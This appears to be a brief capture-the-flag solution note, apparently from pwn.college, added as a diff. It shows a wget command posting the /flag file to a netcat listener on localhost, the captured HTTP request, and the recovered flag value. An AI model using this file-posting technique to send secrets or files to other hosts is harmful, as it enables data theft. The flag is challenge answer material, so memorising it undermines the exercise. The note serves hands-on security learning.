@@ -1,0 +1,19 @@
+making a wget  request and listen with netcat for the the falg 
+
+
+wget --post-file=/flag http://localhost:80
+
+
+nc -l -p 80 
+POST / HTTP/1.1
+User-Agent: Wget/1.20.3 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: localhost
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+
+pwn.college{40RiRz9JHBuDrZbZY7SnHKPAp6J.0lM5EDL1kjMzQzW}
+
+
